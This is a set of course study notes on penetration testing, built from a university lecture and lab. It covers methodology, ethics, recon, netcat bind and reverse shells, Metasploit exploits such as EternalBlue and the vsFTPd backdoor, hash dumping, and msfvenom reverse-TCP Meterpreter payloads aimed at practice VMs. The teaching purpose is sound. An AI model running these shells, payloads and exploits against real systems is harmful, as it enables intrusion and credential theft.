# 03. Penetration Testing

> Source material: `L03_Penetration Testing.pdf` (42 slides) and `E03.pdf` (Lab 03, 6 pages), Cybersecurity F26, Centre for Industrial Software (CIS), SDU. Lecturer: Sani Abdullahi (L03 p.1). All claims below are grounded in these two documents; citations point to lecture slides as `(L03 p.N)` and lab pages as `(E03 p.N)`. Where the slides only hint at something, that is noted explicitly.

---

## Overview

Penetration testing ("pentesting") is the **authorized, simulated attack against a running system** to test its security (L03 p.7). It is the natural follow-on to vulnerability assessment (last week's topic, L03 p.2): vulnerability assessment *finds* weaknesses, penetration testing *proves* they are real and exploitable by carefully building a proof of concept that demonstrates the security problem without harming the target (L03 p.8). Pentesting is not a guarantee of security, but it should complement a broader security strategy such as threat modelling during development and deployment (L03 p.7). The EU NIS2 Directive legally requires certain organizations across member states to conduct penetration testing (L03 p.7).

This chapter matters because, in practice, most organizations are flying blind about how they get breached. A Sophos / Vanson Bourne survey of 3,100 IT managers across 12 countries found 68% of companies were hit by a cyber attack in 2023, and 1 in 5 did not know how the attacker got in — "You can't plug holes if you don't know where they are" (L03 p.9). The lecture's practical core is hands-on offensive tooling on a Kali attacker machine against deliberately vulnerable targets (Metasploitable 2 = Linux, Metasploitable 3 = Windows): reconnaissance/enumeration, netcat shells, the Metasploit Framework (auxiliary → exploit → post-exploit modules), and custom payload generation with MSFvenom (L03 p.5). The companion lab (E03) walks the full methodology end-to-end — classify vulnerabilities, plan a strategy, exploit, perform post-exploitation, and write an executive report — and is a graded, exam-supporting submission (E03 p.1).

---

## Key Concepts

### Hacker taxonomy (hat colours and skill)

**What/why:** Before doing offensive work you must place yourself ethically and legally. The lecture gives a simple taxonomy of attackers (L03 p.6):

- **Black hat** — malicious intent, for gain/profit, or destruction for ideological purposes (L03 p.6).
- **White hat** — "ethical hacking": hacking *with permission* to improve security, e.g. penetration testing and assessing risks (L03 p.6).
- **Grey hat** — usually obeys the law, but also hacks *without permission* (L03 p.6).
- **Script kiddy** — slang for an unskilled person who uses one or two pre-made hacking tools or scripts (L03 p.6).

**How it bites:** The slides raise a deliberate ethical tension — "Where should we consider ourselves?" — and note the possible conflict between the hacker's self-view of "doing good" and the victim's perspective (L03 p.6). The lecture pushes this further: even a contracted (white-hat) pentester should ask whether their hacking is genuinely "ethical," and how a hacker differs from a system administrator (L03 p.10). The ethical anchor offered is Kant's Categorical Imperative — "Act only according to that maxim whereby you can, at the same time, will that it should become a universal law" — applied to the idea that large-scale systems run on trust in privileged users, and a complete breakdown of that trust is costly (L03 p.11).

### What penetration testing is (and is not)

**What:** Testing the security of a *running* system via an **authorized "simulated attack"** (L03 p.7).

**Why:** It is **not a guarantee of security**, but it should complement any security strategy — e.g. threat modelling as part of the development/deployment process (L03 p.7). Legal driver: the EU NIS2 Directive requires certain organizations to perform it (L03 p.7).

**How (the methodology / pentest activities):** The lecture lists the activities in order (L03 p.8):

1. **Getting permission** — possibly as part of a job. This is the rules-of-engagement / authorization step (L03 p.8).
2. **Gathering information (recon)** — about the company, IP addresses, web sites; scan IP addresses, enumerate hosts & services, fingerprint services (L03 p.8).
3. **Threat modelling** — defining *what the penetration test covers* (scope) (L03 p.8).
4. **Vulnerability analysis** — connecting the collected intel to possible vulnerabilities (L03 p.8).
5. **Exploitation** — carefully creating a proof of concept that demonstrates the security problem *without harming the target* (L03 p.8).
6. **Reporting** — report and/or fix the problems (L03 p.8).

The lab (E03) operationalizes this same flow as exercises: classification/categorization → strategy & planning → actual exploitation → post-exploitation analysis → executive reporting (E03 p.1–4).

### Why search for actual problems (the evidence)

**What/why:** Justifies pentesting with the Sophos / Vanson Bourne survey of 3,100 IT managers, 12 countries, companies of 100–5000 users (L03 p.9). Key findings:

- 68% of companies were hit by a cyber attack in 2023 (L03 p.9).
- 1 in 5 did not know how the attacker got in (L03 p.9).
- Most threats are discovered late: 37% only when they reach servers, another 37% on the network (L03 p.9).
- "Attacks typically start on endpoint devices, so if companies are only picking them up on the server, that means attackers have already been snooping around their infrastructure for some time" (L03 p.9).

**Takeaway:** Detection is too late and too server-centric; proactively finding holes (pentesting) is how you plug them (L03 p.9).

### Reconnaissance & enumeration — local socket inspection

**What:** Inspect what is open and connected on a host. **Why:** to know which processes, ports and services exist before/while attacking (this is the "enumerating hosts & services, fingerprinting services" step of the methodology, L03 p.8).

**How (L03 p.13):**
- **lsof** — lists open sockets/files; can show files opened by processes and processes for a certain port; needs administrative privileges for all information. Example: `sudo lsof -i :8080` (port 8080).
- **netstat** — network status and active connections (e.g. TCP): `netstat -antp`.
- **ss** — modern equivalent: `ss -at4n`.

### Reconnaissance — DNS querying

**What/why:** The hierarchical Domain Name System (DNS) can be queried to map names to IPs and discover infrastructure (part of "gathering information," L03 p.8).

**How — try these tools (L03 p.14):**
- `nslookup www.google.com`
- `host www.google.com`
- `host -a gmail.com` (all records)
- `dig +trace www.google.com` (traces the resolution from the root down the hierarchy).

### Netcat — the network "Swiss-army knife"

**What:** Netcat (`nc`) is a versatile tool for creating TCP/IP connections; it attaches specific IP addresses and ports (L03 p.15). It "opens pipes over the network."

**Why:** It underpins manual shells (bind and reverse) and file transfer — the primitives that exploits ultimately give you, and a way to understand backdoors without a framework (L03 p.15–18, p.32).

**How — core uses:**

- **Open a listener / connect (L03 p.15):**
  - Listen for incoming connections: `nc -lvnp <port>`
  - Connect to it from another terminal/host: `nc <ip> <port>` (the IP should be your listening host, e.g. the Kali machine).
  - Flags: `-l` listen, `-v` verbose, `-n` no DNS resolution, `-p` port.

- **Bind shell — shell served by the listener (L03 p.16):** Use `-e /bin/bash` to execute a shell. The **listener ("server")** runs `nc -lvnp <port> -e /bin/bash`; the client connects with `nc <ip> <port>` and then runs `whoami` / `id`, getting access *as a user*. **Caution: this lets anyone with access execute commands on your system** (L03 p.16). Practiced locally between Metasploitable 2 and Kali.

- **Reverse shell — "the other way round" (L03 p.17):** The shell connects *out* to the listener. Start the listener **empty**: `nc -lvnp <port>`. On the other host, connect *and* serve the shell: `nc <ip> <port> -e /bin/bash`. Now the *listener* side types `whoami` / `id`. The slide poses the design question: *why* bring up `/bin/bash` as a reverse shell? (Answer in Gotchas: reverse shells beat inbound firewalls/NAT because the victim initiates the outbound connection.)

- **File transfer (L03 p.18):** Stream a file over the network. Sender/receiver pairing:
  - `nc -lvnp <port> < file_contents_to_send`
  - On the other host: `nc <ip> <port> > file_content_received`
  - (In the lab this pattern is reused to move a payload between machines, E03 p.5.)

### Metasploit Framework — what it is and why

**What:** A framework that *provides exploits for vulnerabilities* (L03 p.19). First released in 2003; owned by Rapid7 (L03 p.19).

**Why use it:** Suppose you are a pentester and need to verify a vulnerability on a machine — you may need to exploit it to prove it is a real, prevalent issue (L03 p.19). You can search the internet/online resources such as **https://www.exploit-db.com/**, **but be careful**: not all exploits found online do what they claim; some do *more* and cause further damage to the target. It is important to read through the exploit code and understand what it does (L03 p.19).

### Metasploit module types

Metasploit is organized into module types (L03 p.20–21; ref docs.metasploit.com):

- **Auxiliary** — includes port scanners, fuzzers, sniffers, spoofers, and more (L03 p.20).
- **Exploits** — modules that *use payloads* (L03 p.20). An exploit only works if the target actually has that specific vulnerability (L03 p.28).
- **Payloads** — consist of code that runs *remotely* (on the target) (L03 p.20).
- **Post** — used *after gaining access*, e.g. privilege escalation, credential harvesting, data extraction (L03 p.21).
- **Encoders** — used to encode the payload to bypass antivirus or IDS (L03 p.21).
- **Nops (NOP generators)** — assist buffer-overflow execution (the slide writes "Nopes") (L03 p.21).

### Metasploit console workflow & required options

**Starting (L03 p.22):** Type `msfconsole`. Enter `help` to see all commands and their descriptions. To leave, type `exit` and press enter.

**Finding modules (L03 p.23):** Browse https://www.rapid7.com/db/?type=metasploit, or use the built-in search, e.g. `search appletv`.

**Using modules (L03 p.24):** Select with `use` followed by the module *number* (e.g. `0`) from the search results, or `use <MODULE PATH>`.

**Module info (L03 p.25):** Get details with the `info` keyword.

**Setting required options (L03 p.26):** Modules often need the target and attacker IPs/ports:
- **RHOST / RHOSTS** and **RPORT** = the *target* (remote) IP and port.
- **LHOST** and **LPORT** = the *attacker's* (local) IP and port.

### Auxiliary scanners (service fingerprinting)

The auxiliary module provides many scanners that give more info about a target (L03 p.27). Examples:

| Command | Purpose |
|---|---|
| `use scanner/smb/smb_version` | SMB scanner (L03 p.27) |
| `use auxiliary/scanner/mssql/mssql_ping` | SQL Server scan (L03 p.27) |
| `use scanner/ssh/ssh_version` | SSH server scan (L03 p.27) |
| `use auxiliary/scanner/ftp/anonymous` | Anonymous FTP server scan (L03 p.27) |
| `use auxiliary/scanner/ftp/ftp_version` | FTP server scan (L03 p.27) |
| `use auxiliary/scanner/vnc/vnc_login` | VNC protocol login scan (L03 p.27) |
| `use auxiliary/scanner/http/http_version` | HTTP server scan (L03 p.27) |

### Exploits (target-specific)

Exploits only work if the target has the specific vulnerability (L03 p.28). Examples from the slides:

**Windows targets (e.g. Metasploitable 3-win) (L03 p.28):**
- `use exploit/windows/smb/ms17_010_eternalblue` — EternalBlue, SMB remote kernel corruption.
- `use exploit/windows/browser/ms11_003_ie_css_import` — Cascading Style Sheets (IE) bug.
- `use exploit/windows/fileformat/ms15_100_mc1_exe` — file-format exploit.

**Linux targets (e.g. Metasploitable 2) (L03 p.28):**
- `use exploit/unix/ftp/vsftpd_234_backdoor` — vsFTPd backdoor attack.
- `use exploit/multi/http/php_cgi_arg_injection` — Apache HTTPd (Ubuntu) PHP-CGI argument injection.
- `use exploit/linux/local/sock_sendpage` — Linux kernel flaw (local privilege escalation).

### Worked exploitation flows (auxiliary → exploit)

**VNC login — Metasploitable 2 (L03 p.29–30):**
1. `search vnc protocol 3.3`.
2. `use auxiliary/scanner/vnc/vnc_login`.
3. `show options` and set the target's `RHOSTS` IP.
4. `run` to perform the scan.
5. To begin exploitation, launch `vncviewer` from Kali using the target's IP and log in with the **password provided by the scanner** — you are now inside the target via VNC viewer (L03 p.30).

**vsFTPd 2.3.4 backdoor — Metasploitable 2 (L03 p.31–32):**
1. Start a scan with `ftp_version` to get the vsFTPd version (L03 p.31).
2. Search for the exploit and use it on the target (`use exploit/unix/ftp/vsftpd_234_backdoor`, L03 p.28/p.31).
3. A **shell session opens on the target via port 6200** — the slide asks *why* (the malicious vsFTPd 2.3.4 build opens a hard-coded bind shell/backdoor on TCP 6200 when a trigger username is sent; "Hardcoded bind shell," E03 p.2) (L03 p.31).
4. The slide also shows performing the *same* attack with **only Netcat and Nmap** to fully understand the backdoor concept (L03 p.32).

**EternalBlue (MS17-010) — Metasploitable 3 (Windows) (L03 p.33):**
1. `search eternalblue` and `use` the exploit (`exploit/windows/smb/ms17_010_eternalblue`).
2. Set `RHOSTS` (target) and `LHOST` (attacker).
3. On success you land in a **Meterpreter session** (L03 p.33).

### Post-exploitation ("what next after exploitation?")

After gaining access, run **post** modules (L03 p.34). Examples:

**Windows (Metasploitable 3-win) (L03 p.34):**
- `run post/windows/gather/enum_logged_on_users` — get logged-on users.
- `run post/windows/gather/checkvm` — check if target is a VM.
- `run post/windows/gather/enum_applications` — enumerate installed applications.

**Linux (Metasploitable 2) (L03 p.34):**
- `run post/linux/gather/enum_protections` — check protections (e.g. IDS, sniffers).
- `run post/linux/gather/hashdump` — dump password hashes.
- `run post/linux/gather/enum_network` — network info and settings. *(Slide has typos "linus" / "enum_network"; intent is the Linux network-enumeration post module.)*

**Other Meterpreter post-actions (Metasploitable 3) (L03 p.35–36):**
- Get all IP and MAC addresses associated with the target (L03 p.35).
- Discover the network connections with all machines (L03 p.35).
- List all running processes on the target (L03 p.35).
- Navigate inside the target's filesystem; download or upload a file; take a screenshot, turn on camera/mic, record keyloggers, etc. (L03 p.36).

The lab frames post-exploitation as **risk-impact assessment** after obtaining a shell: harvest credentials (current user context & privilege level), locate sensitive files, identify persistence mechanisms, extract data and password hashes, and assess the potential for lateral ("literal") movement (E03 p.3).

### MSFvenom — custom payload generation

**What:** MSFvenom generates Metasploit payloads; it is a framework instance combining **msfpayload** and **msfencode** to encode a payload and send it to the target (L03 p.37).

**How (L03 p.37–38):**
- See all options: type `msfvenom` from a terminal.
- General form: `msfvenom -p <PayloadPath> -f <FormatType> LHOST=<LocalHost (if reverse connection)> LPORT=<LocalPort>`.
- List all payloads: `msfvenom -l payloads`.
- Example: `msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=172.30.1.20 LPORT=4444` (L03 p.37).

**Most important flags (L03 p.38):**
- `-p` — the Metasploit payload to deliver.
- `-f` — output format (e.g. `.elf`, `.exe`, `.pdf`, `.avi`).
- `-a` — target architecture (default `x86`).
- `-e` — the encoder to use.
- (Slide also uses `--platform` and `-o <outfile>`.) Fuller example: `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f exe LHOST=172.30.1.20 LPORT=4444 -o payload.exe` (L03 p.38).

The slide also demonstrates "two-flag" vs "three-flag" reverse-TCP generation (L03 p.39) and raises the delivery problem: *how do you get the targeted user to execute the payload, and what other delivery methods could you use?* (L03 p.40). The lab explicitly says it does **not** simulate the social-engineering/deception delivery part — that is covered in a future class (E03 p.6).

### Payloads vs. exploits, and the multi/handler listener (from the lab)

**What/why:** Part 2 of the lab is specifically about *payload creation and handling*, not vulnerability discovery — to understand the **difference between payloads and exploits**: generate a reverse-connection payload, set a listener on the attacker, and execute the payload on the target (E03 p.4).

**How — generate payloads (E03 p.4):**
- Metasploitable 2 (Linux):
  ```
  msfvenom \
    -a x86 --platform linux -f elf \
    -p linux/x86/meterpreter/reverse_tcp \
    lhost=<attacker ip> lport=<listening port> \
    -o payload.elf
  ```
- Metasploitable 3 (Windows):
  ```
  msfvenom \
    -a x86 --platform windows -f exe \
    -p windows/meterpreter/reverse_tcp \
    lhost=<attacker ip> lport=<listening port> \
    -o payload.exe
  ```

**How — set up the listener (E03 p.5):**
1. In `msfconsole`, use the generic listener: `use exploit/multi/handler`.
2. Match the payload to the one you generated (Linux): `set payload linux/x86/meterpreter/reverse_tcp`.
3. `show options`; set `LHOST` and `LPORT`. **The handler listens on LHOST/LPORT and the payload connects to that same combination — IP and port must match the values used at generation time** (E03 p.5).
4. Start with `run` (or `exploit`); Metasploit waits for the incoming connection (E03 p.5).

**How — deliver & establish the session (E03 p.5):**
1. Simulate transfer with netcat. On the target (Metasploitable 2): `nc -lvnp 4444 < payload.elf`; on the sender (Kali): `nc <target_ip> 4444 > payload.elf`.
2. Repeat on Metasploitable 3 with the correct payload.
3. Make it executable: `chmod a+x payload.elf`; run it: `./payload.elf` (E03 p.5–6).
4. Verify the session (E03 p.6): inside the session, use `sysinfo` and `getuid` to confirm user context, OS, and successful session; then explore what is accessible (environment, processes, credentials, filesystem, network info).

---

## Glossary

- **Penetration testing (pentest)** — authorized, simulated attack on a running system to test its security; complements (does not replace) a security strategy (L03 p.7).
- **Black hat** — attacker with malicious intent for gain/profit or ideological destruction (L03 p.6).
- **White hat** — ethical hacker; hacks *with permission* to improve security (L03 p.6).
- **Grey hat** — usually law-abiding, but also hacks *without permission* (L03 p.6).
- **Script kiddy** — unskilled person using one or two pre-made hacking tools/scripts (L03 p.6).
- **Rules of engagement / authorization** — the "getting permission" step that makes testing legal; defines scope via threat modelling (L03 p.8).
- **Threat modelling (in pentest)** — defining what the penetration test covers (scope) (L03 p.8).
- **Vulnerability analysis** — connecting collected intel to possible vulnerabilities (L03 p.8).
- **Exploitation** — building a proof of concept that demonstrates a security problem *without harming the target* (L03 p.8).
- **Proof of concept (PoC)** — careful demonstration that a vulnerability is real and exploitable (L03 p.8).
- **EU NIS2 Directive** — EU law requiring certain organizations to conduct penetration testing across member states (L03 p.7).
- **Enumeration** — listing hosts, services, ports, and fingerprinting services during recon (L03 p.8).
- **lsof** — lists open sockets/files; `lsof -i :<port>` shows what holds a port (L03 p.13).
- **netstat / ss** — show network status and active connections (`netstat -antp`, `ss -at4n`) (L03 p.13).
- **DNS enumeration tools** — `nslookup`, `host`, `dig` to query the hierarchical DNS (L03 p.14).
- **Netcat (nc)** — versatile tool for creating TCP/IP connections; "opens pipes over the network" (L03 p.15).
- **Bind shell** — victim *listens* and serves a shell; attacker connects in (`nc -lvnp <port> -e /bin/bash`) (L03 p.16).
- **Reverse shell** — victim connects *out* to the attacker's listener and serves a shell (`nc <ip> <port> -e /bin/bash`) (L03 p.17).
- **Metasploit Framework** — framework providing exploits for vulnerabilities; released 2003, owned by Rapid7 (L03 p.19).
- **msfconsole** — the Metasploit command console (L03 p.22).
- **Auxiliary module** — scanners, fuzzers, sniffers, spoofers (L03 p.20).
- **Exploit module** — a module that uses a payload; needs the specific vulnerability present (L03 p.20, p.28).
- **Payload** — code that runs remotely on the target (L03 p.20).
- **Post module** — used after access: privilege escalation, credential harvesting, data extraction (L03 p.21).
- **Encoder** — encodes a payload to bypass antivirus / IDS (L03 p.21).
- **NOP (Nops) module** — assists buffer-overflow execution (L03 p.21).
- **RHOST/RHOSTS, RPORT** — target (remote) IP and port (L03 p.26).
- **LHOST, LPORT** — attacker (local) IP and port (L03 p.26).
- **Meterpreter** — advanced payload/session you land in after certain exploits (e.g. EternalBlue), enabling rich post-exploitation (L03 p.33, p.36).
- **EternalBlue (MS17-010)** — SMB remote Windows kernel-corruption exploit (L03 p.28, p.33).
- **vsFTPd 2.3.4 backdoor** — backdoored FTP build that opens a hard-coded bind shell on port 6200 when triggered (L03 p.28, p.31; "Hardcoded bind shell," E03 p.2).
- **MSFvenom** — generates Metasploit payloads; combines msfpayload + msfencode (L03 p.37).
- **multi/handler** — generic Metasploit listener that catches connections from a standalone payload (E03 p.5).
- **Metasploitable 2 / 3** — deliberately vulnerable Linux / Windows target VMs used in the labs (L03 p.5; E03 p.1).
- **Lateral ("literal") movement** — moving from one compromised host to others; assessed in post-exploitation (E03 p.2–3). *(Lab spells it "literal/literal movement"; the standard term is lateral movement.)*

---

## How-To Cookbook

### A. Local recon on a host you can log into (L03 p.13)
1. List what holds a specific port: `sudo lsof -i :8080`.
2. Show all active TCP connections + owning programs: `netstat -antp`.
3. Modern equivalent: `ss -at4n`.
4. Note: full information needs administrative privileges (L03 p.13).

### B. DNS reconnaissance (L03 p.14)
1. Quick name lookup: `nslookup www.google.com`.
2. Resolve with `host`: `host www.google.com`.
3. All record types for a domain: `host -a gmail.com`.
4. Trace resolution from the DNS root downward: `dig +trace www.google.com`.

### C. Netcat bind shell (victim listens) (L03 p.16)
1. On the **victim** (e.g. Metasploitable 2): `nc -lvnp <port> -e /bin/bash`.
2. On the **attacker** (Kali): `nc <victim_ip> <port>`.
3. Once connected, run `whoami` and `id` to confirm the user context.
4. Caution: this exposes command execution to anyone who can reach the port (L03 p.16).

### D. Netcat reverse shell (victim connects out) (L03 p.17)
1. On the **attacker** (Kali), start an empty listener: `nc -lvnp <port>`.
2. On the **victim**, connect back and serve a shell: `nc <attacker_ip> <port> -e /bin/bash`.
3. On the attacker's listener, run `whoami` / `id`.
4. Rationale to remember: reverse shells get out through inbound firewalls/NAT because the victim initiates the connection (slide question, L03 p.17).

### E. Netcat file transfer (L03 p.18)
1. Receiver listens and writes to a file: `nc -lvnp <port> > file_content_received`. *(Slide also shows the listener as the sender: `nc -lvnp <port> < file_to_send` — the redirection direction sets who sends.)*
2. The other side connects: sender `nc <ip> <port> < file_to_send`, or receiver `nc <ip> <port> > file_content_received`.
3. In the lab this exact pattern moves `payload.elf` between machines (E03 p.5).

### F. Metasploit auxiliary → exploit (general workflow) (L03 p.22–28)
1. Launch the console: `msfconsole` (use `help`; leave with `exit`) (L03 p.22).
2. Find a module: `search <keyword>` (e.g. `search appletv`) or browse rapid7.com/db (L03 p.23).
3. Select it: `use <number>` or `use <MODULE PATH>` (L03 p.24).
4. Inspect it: `info` (L03 p.25).
5. Show and set required options: `show options`, then `set RHOSTS <target_ip>`, `set LHOST <attacker_ip>`, ports as needed (RHOST/RPORT = target; LHOST/LPORT = attacker) (L03 p.26).
6. Run a scanner (auxiliary) with `run`, or fire an exploit with `exploit`/`run`.

### G. VNC scan-to-exploit, Metasploitable 2 (L03 p.29–30)
1. `search vnc protocol 3.3`.
2. `use auxiliary/scanner/vnc/vnc_login`.
3. `show options`; `set RHOSTS <target_ip>`.
4. `run` to scan; the scanner reveals the VNC login password.
5. From Kali: `vncviewer <target_ip>` and log in with that password — you are inside the target (L03 p.30).

### H. vsFTPd 2.3.4 backdoor, Metasploitable 2 (L03 p.31–32)
1. Fingerprint FTP: `use auxiliary/scanner/ftp/ftp_version`, set `RHOSTS`, `run` — confirm version 2.3.4 (L03 p.31).
2. Exploit it: `use exploit/unix/ftp/vsftpd_234_backdoor`, set `RHOSTS`, `exploit` (L03 p.28, p.31).
3. A root shell session opens on the target via port 6200 (the hard-coded backdoor) (L03 p.31).
4. Optional understanding-builder: reproduce with only Nmap + Netcat (L03 p.32).

### I. EternalBlue, Metasploitable 3 (Windows) (L03 p.33)
1. `search eternalblue`.
2. `use exploit/windows/smb/ms17_010_eternalblue`.
3. `set RHOSTS <target_ip>` and `set LHOST <attacker_ip>`.
4. `exploit` — you land in a Meterpreter session (L03 p.33).

### J. Post-exploitation (after you have a session) (L03 p.34–36; E03 p.3)
1. Windows: `run post/windows/gather/enum_logged_on_users`, `run post/windows/gather/checkvm`, `run post/windows/gather/enum_applications` (L03 p.34).
2. Linux: `run post/linux/gather/enum_protections`, `run post/linux/gather/hashdump`, `run post/linux/gather/enum_network` (L03 p.34).
3. In Meterpreter: enumerate IP/MAC addresses, network connections, and running processes; navigate the filesystem, upload/download files, screenshot, etc. (L03 p.35–36).
4. Lab framing: harvest credentials, locate sensitive files, find persistence, extract data + hashes, assess lateral-movement potential (E03 p.3).

### K. MSFvenom payload + multi/handler end-to-end (L03 p.37–38; E03 p.4–6)
1. Generate a Linux reverse-Meterpreter ELF:
   `msfvenom -a x86 --platform linux -f elf -p linux/x86/meterpreter/reverse_tcp lhost=<attacker_ip> lport=<port> -o payload.elf` (E03 p.4).
   (Windows variant: `--platform windows -f exe -p windows/meterpreter/reverse_tcp ... -o payload.exe`.)
2. Start the catcher in `msfconsole`: `use exploit/multi/handler`; `set payload linux/x86/meterpreter/reverse_tcp`; `show options`; `set LHOST <attacker_ip>`; `set LPORT <port>` — must match the payload's values (E03 p.5).
3. `run` the handler; it waits for the connection (E03 p.5).
4. Deliver the payload (lab simulates with netcat): target `nc -lvnp 4444 < payload.elf`, sender `nc <target_ip> 4444 > payload.elf` (E03 p.5).
5. On the target: `chmod a+x payload.elf` then `./payload.elf` (E03 p.5–6).
6. In the session: `sysinfo`, `getuid`; then explore environment/processes/credentials/filesystem/network (E03 p.6).

### L. Lab deliverable workflow (E03 p.1–4)
1. **Classify**: build a table per target (Port, Service, Version, Vulnerability Type, Exploitable Y/N, Risk Level) from prior scans; categorize each type (e.g. Backdoored service, Weak/default credentials, RCE, Privilege escalation, Misconfiguration, Legacy insecure protocol, etc.); justify each (E03 p.1–2).
2. **Plan**: pick the 5 highest-priority services per target; justify priority; note which need authentication; predict which give immediate root (E03 p.2).
3. **Exploit**: hit your 5; if not, you *must* exploit the mandated minimums — M2: 1 backdoored, 1 weak/default-cred, 1 RCE, 1 misconfiguration; M3: 1 network RCE (e.g. SMB), 1 credential compromise, 1 privilege escalation. Document module used, and evidence: `whoami`, `ip a`, `id`/`getuid`, session screenshot, attack-path explanation (E03 p.3).
4. **Post-exploit**: credential harvest, sensitive files, persistence, data/hash extraction, lateral-movement assessment (E03 p.3).
5. **Report**: 1-page executive summary (business impact) + technical write-up of ≥3 critical vulns (root cause, exploitation method high-level, impact, CVE if applicable, remediation) (E03 p.3–4).

---

## Exam-Style Q&A

**Q1. Define penetration testing and state what it is *not*.**
A. Penetration testing is an **authorized "simulated attack"** that tests the security of a *running* system (L03 p.7). It is **not a guarantee of security**; it should *complement* a broader security strategy such as threat modelling within development/deployment (L03 p.7). Legally, the EU NIS2 Directive requires certain organizations to perform it (L03 p.7).

**Q2. List the penetration-testing activities/methodology in order.**
A. (1) Getting permission, (2) Gathering information / recon (company info, IPs, sites; scan IPs, enumerate hosts & services, fingerprint services), (3) Threat modelling (define scope/what the test covers), (4) Vulnerability analysis (link intel to possible vulnerabilities), (5) Exploitation (careful PoC demonstrating the problem *without harming the target*), (6) Reporting (report and/or fix) (L03 p.8). The lab mirrors this as classify → plan → exploit → post-exploit → report (E03 p.1–4).

**Q3. Distinguish black/white/grey hats and script kiddies. Where does a contracted pentester sit, and what is the ethical caveat?**
A. Black hat = malicious intent for gain/profit or ideological destruction; white hat = ethical hacking *with permission* to improve security (e.g. pentesting); grey hat = usually law-abiding but hacks *without permission*; script kiddy = unskilled user of one or two pre-made tools/scripts (L03 p.6). A contracted pentester is a **white hat** because they have authorization. The caveat: even with permission the activity raises ethical tension — the hacker's self-view of "doing good" can conflict with the victim's perspective, and the lecture invites Kant's Categorical Imperative as a test (act only on a maxim you could will to be a universal law) (L03 p.6, p.10–11).

**Q4. Explain the difference between a bind shell and a reverse shell using netcat, with commands. Why prefer a reverse shell?**
A. **Bind shell** — the *victim* listens and serves the shell; the attacker connects in. Victim: `nc -lvnp <port> -e /bin/bash`; attacker: `nc <ip> <port>` (L03 p.16). **Reverse shell** — the *victim* connects *out* to the attacker's empty listener and serves the shell. Attacker: `nc -lvnp <port>`; victim: `nc <attacker_ip> <port> -e /bin/bash` (L03 p.17). A reverse shell is preferred because the outbound connection from the victim typically traverses inbound firewalls and NAT, where a bind shell's inbound listening port would usually be blocked (rationale to the slide's question "why bring up /bin/bash as a reverse shell?", L03 p.17). The slides also warn that `-e /bin/bash` lets *anyone* with access run commands — handle with care (L03 p.16).

**Q5. Name the six Metasploit module types and give one example use of each.**
A. (1) **Auxiliary** — scanners/fuzzers/sniffers/spoofers, e.g. `scanner/ssh/ssh_version` (L03 p.20, p.27); (2) **Exploit** — uses a payload against a specific vuln, e.g. `exploit/windows/smb/ms17_010_eternalblue` (L03 p.20, p.28); (3) **Payload** — code that runs remotely on the target, e.g. `windows/meterpreter/reverse_tcp` (L03 p.20, p.37); (4) **Post** — after access (priv-esc, credential harvest, data extraction), e.g. `post/linux/gather/hashdump` (L03 p.21, p.34); (5) **Encoder** — encode payload to evade AV/IDS (L03 p.21); (6) **NOP/Nops** — assist buffer-overflow execution (L03 p.21).

**Q6. In Metasploit, what do RHOST, RPORT, LHOST and LPORT mean, and why must they match in a multi/handler setup?**
A. **RHOST/RHOSTS** and **RPORT** are the *target's* (remote) IP and port; **LHOST** and **LPORT** are the *attacker's* (local) IP and port (L03 p.26). For a standalone reverse payload caught by `exploit/multi/handler`, the **handler listens on LHOST/LPORT and the payload was generated to connect to that same LHOST/LPORT** — if they don't match, the payload's outbound connection never reaches the listener and no session forms (E03 p.5).

**Q7. Walk through exploiting the vsFTPd 2.3.4 backdoor on Metasploitable 2. Why does a shell appear on port 6200?**
A. (1) Fingerprint FTP with `auxiliary/scanner/ftp/ftp_version` to confirm version 2.3.4 (L03 p.31); (2) `use exploit/unix/ftp/vsftpd_234_backdoor`, set `RHOSTS`, `exploit` (L03 p.28, p.31); (3) a shell session opens on the target via **port 6200**. It appears because vsFTPd 2.3.4 was shipped with a malicious **hard-coded bind-shell backdoor**: sending a trigger username causes the daemon to open a root shell listening on TCP 6200 (slide poses "why?"; the lab classifies this as a "Backdoored service" / "Hardcoded bind shell") (L03 p.31; E03 p.2). The lecture also shows reproducing it with only Nmap + Netcat to demystify the backdoor (L03 p.32).

**Q8. What is EternalBlue and what session do you land in after using it?**
A. EternalBlue is `exploit/windows/smb/ms17_010_eternalblue` — an SMB remote Windows kernel-corruption exploit (L03 p.28). Workflow: `search eternalblue`, `use` it, set `RHOSTS` (target) and `LHOST` (attacker), then exploit; on success you land in a **Meterpreter session** (L03 p.33).

**Q9. List four useful post-exploitation modules — two Linux, two Windows — and what they retrieve.**
A. Linux (Metasploitable 2): `post/linux/gather/hashdump` (dump password hashes) and `post/linux/gather/enum_protections` (detect IDS/sniffers/protections) (L03 p.34). Windows (Metasploitable 3): `post/windows/gather/enum_logged_on_users` (logged-on users) and `post/windows/gather/checkvm` (is the host a VM) (L03 p.34). Additionally `post/linux/gather/enum_network` / Meterpreter can list IP & MAC addresses, network connections, and running processes (L03 p.34–35).

**Q10. Construct an MSFvenom command for a Windows reverse-TCP Meterpreter EXE and explain each flag.**
A. `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f exe LHOST=172.30.1.20 LPORT=4444 -o payload.exe` (L03 p.38). Flags: `-a x86` = target architecture (default x86); `--platform windows` = OS platform; `-p` = the payload to deliver; `-f exe` = output format (others: `.elf`, `.pdf`, `.avi`); `LHOST`/`LPORT` = attacker IP/port the payload calls back to; `-o` = output file. `-e` would add an encoder to evade AV/IDS (L03 p.38; encoders L03 p.21).

**Q11. What is MSFvenom and how does it relate to msfpayload/msfencode?**
A. MSFvenom is a Metasploit instance used to *generate payloads*; it **combines msfpayload and msfencode** to encode a payload and send it to the target (L03 p.37). List payloads with `msfvenom -l payloads`; run `msfvenom` alone to see all options (L03 p.37).

**Q12. After generating a standalone payload, how do you receive its connection in Metasploit? Give the steps.**
A. Use the generic listener: `use exploit/multi/handler`; `set payload <same payload as generated, e.g. linux/x86/meterpreter/reverse_tcp>`; `show options`; `set LHOST`/`set LPORT` to match the payload; then `run`/`exploit`. Metasploit then waits for the incoming connection until the payload executes on the target (E03 p.5).

**Q13. Why bother pentesting? Cite the survey evidence.**
A. Per a Sophos / Vanson Bourne survey of 3,100 IT managers across 12 countries (100–5000 users): 68% of companies were hit by a cyber attack in 2023; 1 in 5 didn't know how the attacker got in ("you can't plug holes if you don't know where they are"); 37% of threats are found only at servers and 37% on the network, meaning attackers had already been "snooping around" before detection (L03 p.9). Pentesting proactively finds those holes so they can be fixed.

